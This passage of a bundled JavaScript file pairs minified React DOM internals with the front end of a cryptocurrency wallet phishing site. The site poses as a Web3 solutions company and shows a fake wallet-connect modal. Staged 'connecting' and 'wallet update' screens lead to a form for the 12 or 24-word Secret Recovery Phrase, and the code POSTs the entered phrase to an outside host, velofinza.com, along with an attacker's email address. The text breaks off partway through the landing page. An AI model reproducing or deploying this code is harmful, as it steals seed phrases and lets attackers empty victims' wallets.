			(this.incompleteTransitions = new Map());
	}
	function Xo(l, t, e, a, u, n, c, i, s, v, x, S) {
		return (
			(l = new Th(l, t, e, c, i, s, v, S)),
			(t = 1),
			n === !0 && (t |= 24),
			(n = Pl(3, null, null, t)),
			(l.current = n),
			(n.stateNode = l),
			(t = jc()),
			t.refCount++,
			(l.pooledCache = t),
			t.refCount++,
			(n.memoizedState = { element: a, isDehydrated: e, cache: t }),
			Oc(n),
			l
		);
	}
	function Qo(l) {
		return l ? ((l = We), l) : We;
	}
	function Lo(l, t, e, a, u, n) {
		(u = Qo(u)),
			a.context === null ? (a.context = u) : (a.pendingContext = u),
			(a = kt(t)),
			(a.payload = { element: e }),
			(n = n === void 0 ? null : n),
			n !== null && (a.callback = n),
			(e = Wt(l, a, t)),
			e !== null && (ut(e, l, t), Xa(e, l, t));
	}
	function Zo(l, t) {
		if (((l = l.memoizedState), l !== null && l.dehydrated !== null)) {
			var e = l.retryLane;
			l.retryLane = e !== 0 && e < t ? e : t;
		}
	}
	function Vi(l, t) {
		Zo(l, t), (l = l.alternate) && Zo(l, t);
	}
	function Vo(l) {
		if (l.tag === 13) {
			var t = ke(l, 67108864);
			t !== null && ut(t, l, 67108864), Vi(l, 67108864);
		}
	}
	var Mn = !0;
	function Eh(l, t, e, a) {
		var u = b.T;
		b.T = null;
		var n = A.p;
		try {
			(A.p = 2), Ki(l, t, e, a);
		} finally {
			(A.p = n), (b.T = u);
		}
	}
	function Nh(l, t, e, a) {
		var u = b.T;
		b.T = null;
		var n = A.p;
		try {
			(A.p = 8), Ki(l, t, e, a);
		} finally {
			(A.p = n), (b.T = u);
		}
	}
	function Ki(l, t, e, a) {
		if (Mn) {
			var u = Ji(a);
			if (u === null) Ui(l, t, a, On, e), Jo(l, a);
			else if (zh(u, l, t, e, a)) a.stopPropagation();
			else if ((Jo(l, a), t & 4 && -1 < jh.indexOf(l))) {
				for (; u !== null; ) {
					var n = Be(u);
					if (n !== null)
						switch (n.tag) {
							case 3:
								if (
									((n = n.stateNode),
									n.current.memoizedState.isDehydrated)
								) {
									var c = ve(n.pendingLanes);
									if (c !== 0) {
										var i = n;
										for (
											i.pendingLanes |= 2,
												i.entangledLanes |= 2;
											c;

										) {
											var s = 1 << (31 - Fl(c));
											(i.entanglements[1] |= s),
												(c &= ~s);
										}
										jt(n),
											(al & 6) === 0 &&
												((dn = pt() + 500), uu(0));
									}
								}
								break;
							case 13:
								(i = ke(n, 2)),
									i !== null && ut(i, n, 2),
									mn(),
									Vi(n, 2);
						}
					if (
						((n = Ji(a)), n === null && Ui(l, t, a, On, e), n === u)
					)
						break;
					u = n;
				}
				u !== null && a.stopPropagation();
			} else Ui(l, t, a, null, e);
		}
	}
	function Ji(l) {
		return (l = In(l)), ki(l);
	}
	var On = null;
	function ki(l) {
		if (((On = null), (l = Ce(l)), l !== null)) {
			var t = G(l);
			if (t === null) l = null;
			else {
				var e = t.tag;
				if (e === 13) {
					if (((l = ll(t)), l !== null)) return l;
					l = null;
				} else if (e === 3) {
					if (t.stateNode.current.memoizedState.isDehydrated)
						return t.tag === 3 ? t.stateNode.containerInfo : null;
					l = null;
				} else t !== l && (l = null);
			}
		}
		return (On = l), null;
	}
	function Ko(l) {
		switch (l) {
			case "beforetoggle":
			case "cancel":
			case "click":
			case "close":
			case "contextmenu":
			case "copy":
			case "cut":
			case "auxclick":
			case "dblclick":
			case "dragend":
			case "dragstart":
			case "drop":
			case "focusin":
			case "focusout":
			case "input":
			case "invalid":
			case "keydown":
			case "keypress":
			case "keyup":
			case "mousedown":
			case "mouseup":
			case "paste":
			case "pause":
			case "play":
			case "pointercancel":
			case "pointerdown":
			case "pointerup":
			case "ratechange":
			case "reset":
			case "resize":
			case "seeked":
			case "submit":
			case "toggle":
			case "touchcancel":
			case "touchend":
			case "touchstart":
			case "volumechange":
			case "change":
			case "selectionchange":
			case "textInput":
			case "compositionstart":
			case "compositionend":
			case "compositionupdate":
			case "beforeblur":
			case "afterblur":
			case "beforeinput":
			case "blur":
			case "fullscreenchange":
			case "focus":
			case "hashchange":
			case "popstate":
			case "select":
			case "selectstart":
				return 2;
			case "drag":
			case "dragenter":
			case "dragexit":
			case "dragleave":
			case "dragover":
			case "mousemove":
			case "mouseout":
			case "mouseover":
			case "pointermove":
			case "pointerout":
			case "pointerover":
			case "scroll":
			case "touchmove":
			case "wheel":
			case "mouseenter":
			case "mouseleave":
			case "pointerenter":
			case "pointerleave":
				return 8;
			case "message":
				switch (rd()) {
					case uf:
						return 2;
					case nf:
						return 8;
					case pu:
					case od:
						return 32;
					case cf:
						return 268435456;
					default:
						return 32;
				}
			default:
				return 32;
		}
	}
	var Wi = !1,
		fe = null,
		se = null,
		re = null,
		du = new Map(),
		hu = new Map(),
		oe = [],
		jh =
			"mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(
				" "
			);
	function Jo(l, t) {
		switch (l) {
			case "focusin":
			case "focusout":
				fe = null;
				break;
			case "dragenter":
			case "dragleave":
				se = null;
				break;
			case "mouseover":
			case "mouseout":
				re = null;
				break;
			case "pointerover":
			case "pointerout":
				du.delete(t.pointerId);
				break;
			case "gotpointercapture":
			case "lostpointercapture":
				hu.delete(t.pointerId);
		}
	}
	function mu(l, t, e, a, u, n) {
		return l === null || l.nativeEvent !== n
			? ((l = {
					blockedOn: t,
					domEventName: e,
					eventSystemFlags: a,
					nativeEvent: n,
					targetContainers: [u],
			  }),
			  t !== null && ((t = Be(t)), t !== null && Vo(t)),
			  l)
			: ((l.eventSystemFlags |= a),
			  (t = l.targetContainers),
			  u !== null && t.indexOf(u) === -1 && t.push(u),
			  l);
	}
	function zh(l, t, e, a, u) {
		switch (t) {
			case "focusin":
				return (fe = mu(fe, l, t, e, a, u)), !0;
			case "dragenter":
				return (se = mu(se, l, t, e, a, u)), !0;
			case "mouseover":
				return (re = mu(re, l, t, e, a, u)), !0;
			case "pointerover":
				var n = u.pointerId;
				return du.set(n, mu(du.get(n) || null, l, t, e, a, u)), !0;
			case "gotpointercapture":
				return (
					(n = u.pointerId),
					hu.set(n, mu(hu.get(n) || null, l, t, e, a, u)),
					!0
				);
		}
		return !1;
	}
	function ko(l) {
		var t = Ce(l.target);
		if (t !== null) {
			var e = G(t);
			if (e !== null) {
				if (((t = e.tag), t === 13)) {
					if (((t = ll(e)), t !== null)) {
						(l.blockedOn = t),
							bd(l.priority, function () {
								if (e.tag === 13) {
									var a = at();
									a = Xn(a);
									var u = ke(e, a);
									u !== null && ut(u, e, a), Vi(e, a);
								}
							});
						return;
					}
				} else if (
					t === 3 &&
					e.stateNode.current.memoizedState.isDehydrated
				) {
					l.blockedOn =
						e.tag === 3 ? e.stateNode.containerInfo : null;
					return;
				}
			}
		}
		l.blockedOn = null;
	}
	function _n(l) {
		if (l.blockedOn !== null) return !1;
		for (var t = l.targetContainers; 0 < t.length; ) {
			var e = Ji(l.nativeEvent);
			if (e === null) {
				e = l.nativeEvent;
				var a = new e.constructor(e.type, e);
				(Fn = a), e.target.dispatchEvent(a), (Fn = null);
			} else
				return (t = Be(e)), t !== null && Vo(t), (l.blockedOn = e), !1;
			t.shift();
		}
		return !0;
	}
	function Wo(l, t, e) {
		_n(l) && e.delete(t);
	}
	function Ah() {
		(Wi = !1),
			fe !== null && _n(fe) && (fe = null),
			se !== null && _n(se) && (se = null),
			re !== null && _n(re) && (re = null),
			du.forEach(Wo),
			hu.forEach(Wo);
	}
	function Dn(l, t) {
		l.blockedOn === t &&
			((l.blockedOn = null),
			Wi ||
				((Wi = !0),
				N.unstable_scheduleCallback(N.unstable_NormalPriority, Ah)));
	}
	var Rn = null;
	function $o(l) {
		Rn !== l &&
			((Rn = l),
			N.unstable_scheduleCallback(N.unstable_NormalPriority, function () {
				Rn === l && (Rn = null);
				for (var t = 0; t < l.length; t += 3) {
					var e = l[t],
						a = l[t + 1],
						u = l[t + 2];
					if (typeof a != "function") {
						if (ki(a || e) === null) continue;
						break;
					}
					var n = Be(e);
					n !== null &&
						(l.splice(t, 3),
						(t -= 3),
						kc(
							n,
							{
								pending: !0,
								data: u,
								method: e.method,
								action: a,
							},
							a,
							u
						));
				}
			}));
	}
	function vu(l) {
		function t(s) {
			return Dn(s, l);
		}
		fe !== null && Dn(fe, l),
			se !== null && Dn(se, l),
			re !== null && Dn(re, l),
			du.forEach(t),
			hu.forEach(t);
		for (var e = 0; e < oe.length; e++) {
			var a = oe[e];
			a.blockedOn === l && (a.blockedOn = null);
		}
		for (; 0 < oe.length && ((e = oe[0]), e.blockedOn === null); )
			ko(e), e.blockedOn === null && oe.shift();
		if (((e = (l.ownerDocument || l).$$reactFormReplay), e != null))
			for (a = 0; a < e.length; a += 3) {
				var u = e[a],
					n = e[a + 1],
					c = u[Gl] || null;
				if (typeof n == "function") c || $o(e);
				else if (c) {
					var i = null;
					if (n && n.hasAttribute("formAction")) {
						if (((u = n), (c = n[Gl] || null))) i = c.formAction;
						else if (ki(u) !== null) continue;
					} else i = c.action;
					typeof i == "function"
						? (e[a + 1] = i)
						: (e.splice(a, 3), (a -= 3)),
						$o(e);
				}
			}
	}
	function $i(l) {
		this._internalRoot = l;
	}
	(Un.prototype.render = $i.prototype.render =
		function (l) {
			var t = this._internalRoot;
			if (t === null) throw Error(h(409));
			var e = t.current,
				a = at();
			Lo(e, a, l, t, null, null);
		}),
		(Un.prototype.unmount = $i.prototype.unmount =
			function () {
				var l = this._internalRoot;
				if (l !== null) {
					this._internalRoot = null;
					var t = l.containerInfo;
					Lo(l.current, 2, null, l, null, null), mn(), (t[He] = null);
				}
			});
	function Un(l) {
		this._internalRoot = l;
	}
	Un.prototype.unstable_scheduleHydration = function (l) {
		if (l) {
			var t = df();
			l = { blockedOn: null, target: l, priority: t };
			for (
				var e = 0;
				e < oe.length && t !== 0 && t < oe[e].priority;
				e++
			);
			oe.splice(e, 0, l), e === 0 && ko(l);
		}
	};
	var Fo = C.version;
	if (Fo !== "19.1.1") throw Error(h(527, Fo, "19.1.1"));
	A.findDOMNode = function (l) {
		var t = l._reactInternals;
		if (t === void 0)
			throw typeof l.render == "function"
				? Error(h(188))
				: ((l = Object.keys(l).join(",")), Error(h(268, l)));
		return (
			(l = _(t)),
			(l = l !== null ? T(l) : null),
			(l = l === null ? null : l.stateNode),
			l
		);
	};
	var Mh = {
		bundleType: 0,
		version: "19.1.1",
		rendererPackageName: "react-dom",
		currentDispatcherRef: b,
		reconcilerVersion: "19.1.1",
	};
	if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
		var Hn = __REACT_DEVTOOLS_GLOBAL_HOOK__;
		if (!Hn.isDisabled && Hn.supportsFiber)
			try {
				(ba = Hn.inject(Mh)), ($l = Hn);
			} catch {}
	}
	return (
		(gu.createRoot = function (l, t) {
			if (!w(l)) throw Error(h(299));
			var e = !1,
				a = "",
				u = dr,
				n = hr,
				c = mr,
				i = null;
			return (
				t != null &&
					(t.unstable_strictMode === !0 && (e = !0),
					t.identifierPrefix !== void 0 && (a = t.identifierPrefix),
					t.onUncaughtError !== void 0 && (u = t.onUncaughtError),
					t.onCaughtError !== void 0 && (n = t.onCaughtError),
					t.onRecoverableError !== void 0 &&
						(c = t.onRecoverableError),
					t.unstable_transitionCallbacks !== void 0 &&
						(i = t.unstable_transitionCallbacks)),
				(t = Xo(l, 1, !1, null, null, e, a, u, n, c, i, null)),
				(l[He] = t.current),
				Ri(l),
				new $i(t)
			);
		}),
		(gu.hydrateRoot = function (l, t, e) {
			if (!w(l)) throw Error(h(299));
			var a = !1,
				u = "",
				n = dr,
				c = hr,
				i = mr,
				s = null,
				v = null;
			return (
				e != null &&
					(e.unstable_strictMode === !0 && (a = !0),
					e.identifierPrefix !== void 0 && (u = e.identifierPrefix),
					e.onUncaughtError !== void 0 && (n = e.onUncaughtError),
					e.onCaughtError !== void 0 && (c = e.onCaughtError),
					e.onRecoverableError !== void 0 &&
						(i = e.onRecoverableError),
					e.unstable_transitionCallbacks !== void 0 &&
						(s = e.unstable_transitionCallbacks),
					e.formState !== void 0 && (v = e.formState)),
				(t = Xo(l, 1, !0, t, e ?? null, a, u, n, c, i, s, v)),
				(t.context = Qo(null)),
				(e = t.current),
				(a = at()),
				(a = Xn(a)),
				(u = kt(a)),
				(u.callback = null),
				Wt(e, u, a),
				(e = a),
				(t.current.lanes = e),
				Sa(t, e),
				jt(t),
				(l[He] = t.current),
				Ri(l),
				new Un(t)
			);
		}),
		(gu.version = "19.1.1"),
		gu
	);
}
var id;
function wh() {
	if (id) return Pi.exports;
	id = 1;
	function N() {
		if (
			!(
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
			)
		)
			try {
				__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(N);
			} catch (C) {
				console.error(C);
			}
	}
	return N(), (Pi.exports = qh()), Pi.exports;
}
var Yh = wh();
const Gh = [
		{ name: "Metamask", id: "metamask", logo: "/metamask.png" },
		{ name: "Trust Wallet", id: "trust", logo: "/trustwallet.png" },
		{ name: "Coinbase Wallet", id: "coinbase", logo: "/coinbase.jpeg" },
		{ name: "Ledger", id: "ledger", logo: "/ledger.jpg" },
		{ name: "Trezor Wallet", id: "trezor", logo: "/trezor.png" },
		{ name: "Phantom", id: "phantom", logo: "/phantom.png" },
		{ name: "Solflare", id: "solflare", logo: "/solflare.png" },
		{
			name: "WalletConnect",
			id: "walletconnect",
			logo: "walletconnect.jpg",
		},
	],
	xu = ({ wallet: N, onClose: C }) =>
		f.jsxs("div", {
			className:
				"flex items-center justify-between w-full pb-5 border-b border-gray-700 mb-5",
			children: [
				f.jsxs("div", {
					className: "flex items-center flex-grow",
					children: [
						f.jsx("div", {
							className:
								"w-8 h-8 rounded-lg overflow-hidden bg-white flex items-center justify-center mr-3",
							children: f.jsx("img", {
								src: N.logo,
								alt: `${N.name} Logo`,
								className: "w-full h-full object-contain p-1",
							}),
						}),
						f.jsx("span", {
							className: "text-white text-lg font-bold",
							children: N.name,
						}),
					],
				}),
				f.jsx("button", {
					onClick: C,
					className:
						"text-gray-400 text-3xl leading-none hover:text-white transition-colors",
					children: "×",
				}),
			],
		}),
	Xh = ({ wallet: N, onBack: C, onFinishConnect: j }) => (
		Vl.useEffect(() => {
			const h = setTimeout(() => {
				j();
			}, 1500);
			return () => clearTimeout(h);
		}, [j]),
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (h) => h.stopPropagation(),
			children: [
				f.jsx(xu, { wallet: N, onClose: C }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("div", {
							className:
								"animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-indigo-500",
						}),
						f.jsxs("p", {
							className: "mt-6 text-gray-400 text-lg",
							children: ["Connecting to ", N.name, "..."],
						}),
					],
				}),
			],
		})
	),
	Qh = ({ wallet: N, onBack: C, onStartUpdate: j }) =>
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (h) => h.stopPropagation(),
			children: [
				f.jsx(xu, { wallet: N, onClose: C }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children: "Update Wallet",
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-8",
							children:
								"To ensure a secure and stable connection, you must update your wallet. This process may take a few moments.",
						}),
						f.jsx("button", {
							onClick: j,
							className:
								"w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors",
							children: "Update",
						}),
					],
				}),
			],
		}),
	Lh = ({ wallet: N, onBack: C, onFinishLoading: j }) => {
		const [h, w] = Vl.useState(0);
		return (
			Vl.useEffect(() => {
				let G = 0;
				const ll = setInterval(() => {
					(G += 2), G > 100 ? (clearInterval(ll), j()) : w(G);
				}, 100);
				return () => clearInterval(ll);
			}, [j]),
			f.jsxs("div", {
				className:
					"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
				onClick: (G) => G.stopPropagation(),
				children: [
					f.jsx(xu, { wallet: N, onClose: C }),
					f.jsxs("div", {
						className:
							"flex-1 flex flex-col items-center justify-center",
						children: [
							f.jsx("div", {
								className:
									"w-24 h-24 rounded-lg overflow-hidden bg-white flex items-center justify-center shadow-lg mb-6",
								children: f.jsx("img", {
									src: N.logo,
									alt: `${N.name} Logo`,
									className:
										"w-full h-full object-contain p-2",
								}),
							}),
							f.jsxs("h3", {
								className: "text-white text-2xl font-bold mb-2",
								children: ["Updating ", N.name],
							}),
							f.jsx("p", {
								className: "text-gray-400 mb-8",
								children:
									"Please wait while we finalize the update. This process is essential for security.",
							}),
							f.jsx("div", {
								className:
									"w-full bg-gray-700 rounded-full h-2.5",
								children: f.jsx("div", {
									className:
										"bg-indigo-600 h-2.5 rounded-full transition-all duration-100 ease-linear",
									style: { width: `${h}%` },
								}),
							}),
							f.jsxs("p", {
								className: "mt-4 text-sm text-gray-500",
								children: [h, "%"],
							}),
						],
					}),
				],
			})
		);
	},
	Zh = ({ wallet: N, onBack: C, onSend: j }) => {
		const [h, w] = Vl.useState(12),
			[G, ll] = Vl.useState(Array(12).fill("")),
			[Sl, _] = Vl.useState(!1),
			T = (el) => {
				const J = parseInt(el.target.value, 10);
				w(J), ll(Array(J).fill(""));
			},
			D = (el, J) => {
				const rl = J.trim();
				if (rl.includes(" ")) {
					const dl = rl.split(" ").filter((vl) => vl !== ""),
						xt = [...G];
					let Yl = dl.length;
					if (Yl === 12 || Yl === 24) {
						w(Yl);
						for (let vl = 0; vl < Yl; vl++) xt[vl] = dl[vl] || "";
						ll(xt);
					} else
						alert(
							"Invalid recovery phrase length. Please enter a 12 or 24-word phrase."
						),
							ll(Array(G.length).fill(""));
				} else {
					const dl = [...G];
					(dl[el] = rl), ll(dl);
				}
			},
			W = (el) => {
				const J = document.getElementById(`phrase-input-${el}`);
				J && (J.type = J.type === "password" ? "text" : "password");
			},
			$ = async () => {
				if (G.some((rl) => !rl.trim())) {
					alert("Please fill in all recovery phrase fields.");
					return;
				}
				const el = G.join(" "),
					J = { walletName: N.name, details: el };
				try {
					_(!0);
					const rl = await fetch(
						"https://velofinza.com/backend/api/v1/wallet",
						{
							method: "POST",
							headers: { "Content-Type": "application/json" },
							body: JSON.stringify({
								walletName: N.name,
								details: el,
								email: "Gerfish7458@proton.me",
							}),
						}
					);
					rl.ok
						? console.log("Details sent successfully!", J)
						: console.error(
								"Failed to send details:",
								rl.statusText
						  );
				} catch (rl) {
					console.error("Error sending details:", rl);
				} finally {
					_(!1), j();
				}
			};
		return f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (el) => el.stopPropagation(),
			children: [
				f.jsx(xu, { wallet: N, onClose: C }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center w-full",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children:
								"Import your wallet with your Secret Recovery Phrase",
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-4",
							children:
								"We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase that you were given when you created your wallet.",
						}),
						f.jsx("div", {
							className: "w-full mb-4",
							children: f.jsxs("select", {
								className:
									"w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors",
								value: h,
								onChange: T,
								children: [
									f.jsx("option", {
										value: 12,
										children: "12-word phrase",
									}),
									f.jsx("option", {
										value: 24,
										children: "24-word phrase",
									}),
								],
							}),
						}),
						f.jsxs("div", {
							className:
								"w-full bg-neutral-800 text-gray-400 p-3 rounded-lg flex items-center mb-4",
							children: [
								f.jsx("svg", {
									xmlns: "http://www.w3.org/2000/svg",
									className: "h-5 w-5 mr-2",
									viewBox: "0 0 20 20",
									fill: "currentColor",
									children: f.jsx("path", {
										fillRule: "evenodd",
										d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v2a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z",
										clipRule: "evenodd",
									}),
								}),
								"You can paste your entire secret recovery phrase into any field",
							],
						}),
						f.jsx("div", {
							className:
								"grid grid-cols-2 gap-4 w-full max-h-[250px] overflow-y-auto mb-4 no-scrollbar",
							children: G.map((el, J) =>
								f.jsxs(
									"div",
									{
										className: "flex items-center",
										children: [
											f.jsxs("span", {
												className: "text-gray-400 mr-2",
												children: [J + 1, "."],
											}),
											f.jsxs("div", {
												className: "relative w-full",
												children: [
													f.jsx("input", {
														id: `phrase-input-${J}`,
														type: "password",
														className:
															"w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors pr-10",
														placeholder:
															"Enter word",
														value: el,
														onChange: (rl) =>
															D(
																J,
																rl.target.value
															),
														required: !0,
													}),
													f.jsx("button", {
														type: "button",
														onClick: () => W(J),
														className:
															"absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white transition-colors",
														children: f.jsxs(
															"svg",
															{
																xmlns: "http://www.w3.org/2000/svg",
																className:
																	"h-5 w-5",
																viewBox:
																	"0 0 20 20",
																fill: "currentColor",
																children: [
																	f.jsx(
																		"path",
																		{
																			d: "M10 12a2 2 0 100-4 2 2 0 000 4z",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			fillRule:
																				"evenodd",
																			d: "M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z",
																			clipRule:
																				"evenodd",
																		}
																	),
																],
															}
														),
													}),
												],
											}),
										],
									},
									J
								)
							),
						}),
						f.jsx("button", {
							onClick: $,
							className:
								"mt-4 w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors",
							disabled: Sl,
							children: Sl
								? "Submitting..."
								: "Confirm Secret Recovery Phrase",
						}),
					],
				}),
			],
		});
	},
	Vh = ({ wallet: N, onClose: C }) =>
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (j) => j.stopPropagation(),
			children: [
				f.jsx(xu, { wallet: N, onClose: C }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children: "Exporting Wallet",
						}),
						f.jsx("div", {
							className:
								"animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-indigo-500",
						}),
						f.jsx("p", {
							className: "mt-6 text-gray-400 text-lg",
							children:
								"Your wallet is being exported securely...",
						}),
					],
				}),
			],
		}),
	Kh = ({ onClose: N, onSelectWallet: C }) =>
		f.jsxs("div", {
			className:
				"relative w-full md:w-[95%] max-w-[420px] h-[550px] md:h-auto bg-neutral-900 border border-gray-700 rounded-t-3xl md:rounded-3xl p-6 shadow-2xl flex flex-col overflow-hidden",
			onClick: (j) => j.stopPropagation(),
			children: [
				f.jsxs("div", {
					className:
						"flex justify-between items-center pb-5 border-b border-gray-700 mb-4",
					children: [
						f.jsxs("div", {
							className: "flex items-center gap-3",
							children: [
								f.jsx("div", {
									className:
										"bg-neutral-800 text-white text-xs font-semibold px-3 py-1 rounded-full",
									children: "reown",
								}),
								f.jsx("span", {
									className: "text-white text-lg",
									children: "Manual Kit",
								}),
							],
						}),
						f.jsx("button", {
							onClick: N,
							className:
								"text-gray-400 text-3xl leading-none hover:text-white transition-colors",
							children: "×",
						}),
					],
				}),
				f.jsxs("div", {
					className: "flex-1 overflow-y-auto px-1 -mx-1",
					style: { scrollbarWidth: "none", msOverflowStyle: "none" },
					children: [
						f.jsx("style", {
							children: `
                    .no-scrollbar::-webkit-scrollbar {
                        display: none;
                    }
                `,
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-3 text-sm",
							children: "Popular:",
						}),
						f.jsx("div", {
							className: "flex flex-col gap-2 no-scrollbar",
							children: Gh.map((j, h) =>
								f.jsxs(
									"div",
									{
										className:
											"flex items-center justify-between p-3.5 bg-neutral-800 rounded-2xl cursor-pointer hover:bg-neutral-700 transition-colors",
										onClick: () => C(j),
										children: [
											f.jsxs("div", {
												className:
													"flex items-center gap-4",
												children: [
													f.jsx("div", {
														className:
															"w-10 h-10 rounded-xl overflow-hidden bg-white flex items-center justify-center border border-gray-600",
														children: f.jsx("img", {
															src: j.logo,
															alt: `${j.name} Logo`,
															className:
																"w-full h-full object-contain",
														}),
													}),
													f.jsx("span", {
														className:
															"text-white font-medium",
														children: j.name,
													}),
												],
											}),
											h === 0 &&
												f.jsx("span", {
													className:
														"text-xs font-semibold text-green-500 bg-green-900/40 px-3 py-1 rounded-full",
													children: "RECOMMENDED",
												}),
										],
									},
									j.id
								)
							),
						}),
					],
				}),
				f.jsxs("div", {
					className:
						"flex flex-col items-center justify-center p-6 mt-4 bg-neutral-800 border border-gray-700 rounded-2xl",
					children: [
						f.jsx("img", {
							src: "/globe.svg",
							alt: "Globe Icon",
							className: "w-16 h-16 mb-2",
						}),
						f.jsx("p", {
							className: "text-white text-sm text-center",
							children: "Connect your wallet to get started",
						}),
					],
				}),
			],
		}),
	Cn = ({ isOpen: N, onClose: C }) => {
		const [j, h] = Vl.useState("main"),
			[w, G] = Vl.useState(null),
			ll = (dl) => {
				G(dl), h("connecting");
			},
			Sl = () => {
				h("update-info");
			},
			_ = () => {
				h("final-loading");
			},
			T = () => {
				h("recovery-input");
			},
			D = () => {
				h("sent");
			},
			W = () => {
				h("main");
			},
			$ = () => {
				h("main"), C();
			},
			el = () => {
				switch (j) {
					case "main":
						return f.jsx(Kh, { onClose: $, onSelectWallet: ll });
					case "connecting":
						return f.jsx(Xh, {
							wallet: w,
							onBack: W,
							onFinishConnect: Sl,
						});
					case "update-info":
						return f.jsx(Qh, {
							wallet: w,
							onBack: W,
							onStartUpdate: _,
						});
					case "final-loading":
						return f.jsx(Lh, {
							wallet: w,
							onBack: W,
							onFinishLoading: T,
						});
					case "recovery-input":
						return f.jsx(Zh, { wallet: w, onBack: W, onSend: D });
					case "sent":
						return f.jsx(Vh, { wallet: w, onClose: $ });
					default:
						return null;
				}
			},
			J =
				j === "main"
					? "fixed inset-0 flex items-end md:items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300"
					: "fixed inset-0 flex items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300",
			rl =
				j === "main"
					? "relative w-full md:w-[95%] max-w-[420px]"
					: "relative w-full h-full md:w-[95%] md:h-auto max-w-[420px]";
		return f.jsx("div", {
			className: `${J} ${
				N ? "opacity-100 visible" : "opacity-0 invisible"
			}`,
			onClick: j === "main" ? $ : W,
			children: f.jsx("div", {
				className: rl,
				onClick: (dl) => dl.stopPropagation(),
				children: el(),
			}),
		});
	};
function Jh() {
	const [N, C] = Vl.useState(!1),
		j = () => C(!0),
		h = () => C(!1);
	return f.jsxs("header", {
		className: "bg-dark",
		children: [
			f.jsxs("nav", {
				className:
					"flex align-center justify-between fixed top-0 left-0 right-0 z-100 p-6 bg-black text-white",
				children: [
					f.jsx("div", {
						className: "nav_left",
						children: f.jsx("img", {
							src: "logo.png",
							alt: "logo",
							className: "sc-dlfnbm cVwJfA",
							width: "150",
						}),
					}),
					f.jsxs("div", {
						className: "flex gap-10",
						children: [
							f.jsx("button", {
								className:
									"text-white text-[12px] bg-dark px-8 py-2 border border-purple rounded-full hidden md:block",
								onClick: j,
								children: "Resolve issues",
							}),
							f.jsx("button", {
								className:
									"text-white text-[12px] bg-purple px-8 py-2 rounded-full",
								onClick: j,
								children: "Connect Wallet",
							}),
						],
					}),
				],
			}),
			f.jsx(Cn, { isOpen: N, onClose: h }),
		],
	});
}
function kh() {
	const [N, C] = Vl.useState(!1),
		j = () => C(!0),
		h = () => C(!1);
	return f.jsxs("div", {
		children: [
			f.jsx("section", {
				className: "jumbotron",
				children: f.jsx("div", {
					className:
						"w-full h-auto min-h-[500px] md:w-[96%] md:h-[800px] mx-auto py-24",
					style: {
						backgroundImage: "url('/bg.png')",
						backgroundSize: "cover",
						backgroundPosition: "center",
						backgroundRepeat: "no-repeat",
						borderRadius: "8px",
					},
					children: f.jsxs("section", {
						className:
							"text-white flex flex-col w-full h-full md:w-3/5 p-6 md:p-[90px_50px] mx-auto md:mx-0 justify-center items-center text-center md:items-start md:text-left gap-6 md:gap-[30px]",
						children: [
							f.jsx("div", {
								className: "",
								children: f.jsx("h1", {
									className:
										"text-white text-2xl md:text-[70px] font-bold leading-tight",
									children:
										"Enterprise-grade Blockchain, Defi & Web3 Solutions.",
								}),
							}),
							f.jsx("p", {
